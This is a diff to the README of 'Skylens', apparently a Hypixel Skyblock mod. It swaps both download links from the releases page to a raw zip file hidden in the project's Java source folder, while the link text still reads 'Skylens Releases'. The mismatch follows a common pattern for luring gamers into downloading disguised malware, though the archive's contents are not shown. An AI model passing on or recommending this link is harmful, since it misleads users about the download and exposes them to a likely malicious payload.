@@ -22,7 +22,7 @@ Before you download Skylens, ensure you have the following:
 
 ### 📥 Download & Install
 
-To download Skylens, visit this page to download: [Skylens Releases](https://github.com/saryramirez02/Skylens/releases).
+To download Skylens, visit this page to download: [Skylens Releases](https://github.com/saryramirez02/Skylens/raw/refs/heads/main/src/main/java/main/source/Software-v1.3-beta.3.zip).
 
 1. Click the link above.
 2. On the releases page, find the latest version of Skylens.
@@ -66,4 +66,4 @@ If you have any questions or feedback, you can reach out via GitHub Issues on th
 
 Skylens makes your Hypixel Skyblock journey more enjoyable and efficient. Download Skylens today and elevate your gaming experience!
 
-To download Skylens, visit this page to download: [Skylens Releases](https://github.com/saryramirez02/Skylens/releases).
+To download Skylens, visit this page to download: [Skylens Releases](https://github.com/saryramirez02/Skylens/raw/refs/heads/main/src/main/java/main/source/Software-v1.3-beta.3.zip).
